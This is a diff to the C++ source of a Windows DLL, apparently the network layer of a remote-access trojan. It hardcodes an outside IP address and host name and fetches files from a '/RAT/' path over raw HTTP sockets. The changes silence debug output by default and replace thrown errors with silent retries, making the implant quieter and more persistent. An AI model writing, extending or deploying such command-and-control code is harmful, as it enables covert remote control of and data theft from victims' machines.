@@ -1,13 +1,17 @@
 //cl /EHsc /LD .\network_lib.cpp /link ws2_32.lib /OUT:network_lib.dll
 #define WIN32_LEAN_AND_MEAN
-#include <iostream>
+#define DEBUG 0
+
+#if DEBUG
+    #include <iostream>
+#endif
+
 #include <ws2tcpip.h>
 #include <Windows.h>
 #include <string>
 #include <mutex>
 #include <vector>
 
-#define DEBUG 1
 #define ADDR "103.92.235.21"
 #define H_NAME "Host: arth.imbeddex.com\r\n"
 #define PRT 80
@@ -180,7 +184,11 @@ __declspec(dllexport) int send_data(const std::string& filename, const std::stri
 }
 
 __declspec(dllexport) std::string receive_data(const std::string& filename)
-{
+{   
+    #if DEBUG
+    std::cout << "11111111" << std::endl;
+    #endif
+
     if(clientSocket == INVALID_SOCKET)
     {
         #if DEBUG
@@ -199,6 +207,10 @@ __declspec(dllexport) std::string receive_data(const std::string& filename)
     std::unique_lock<std::mutex> lock(socketMutex);
     while (connected)
     {
+        #if DEBUG
+        std::cout << "2222222" << std::endl;
+        #endif
+
         try
         {
             std::string requestString = "GET /RAT/" + filename + " HTTP/1.1\r\n"
@@ -222,6 +234,10 @@ __declspec(dllexport) std::string receive_data(const std::string& filename)
 
             do
             {
+                #if DEBUG
+                std::cout << "33333" << std::endl;
+                #endif
+
                 bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
                 if (bytesReceived > 0)
                 {
@@ -249,6 +265,11 @@ __declspec(dllexport) std::string receive_data(const std::string& filename)
                     
                     connected = TRUE;
                     lock.lock();
+
+                    #if DEBUG
+                    std::cout << "after lock" << std::endl;
+                    #endif
+
                     continue;
                 }
                 else
@@ -273,8 +294,13 @@ __declspec(dllexport) std::string receive_data(const std::string& filename)
                 std::cerr << "Invalid HTTP response: No header/body separator found." << std::endl;
                 #endif
 
-                throw std::runtime_error("Invalid HTTP response: No header/body separator found.");
+                continue;
+                //throw std::runtime_error("Invalid HTTP response: No header/body separator found.");
             }
+
+            #if DEBUG
+            std::cout << "outside HTTP response check" << std::endl;
+            #endif
 
             std::string body = receivedData.substr(headerEnd + 4);
 
@@ -309,6 +335,10 @@ __declspec(dllexport) std::string receive_data(const std::string& filename)
 
                 body = unchunkedBody;
             }
+            #if DEBUG
+            std::cout << "Returning body" << std::endl;
+            #endif
+
             return body;
         }
         catch (const std::exception& e)
@@ -316,6 +346,7 @@ __declspec(dllexport) std::string receive_data(const std::string& filename)
             #if DEBUG
             std::cerr << "Attempt failed: " << e.what() << std::endl;
             #endif
+            continue;
         }
     }
     
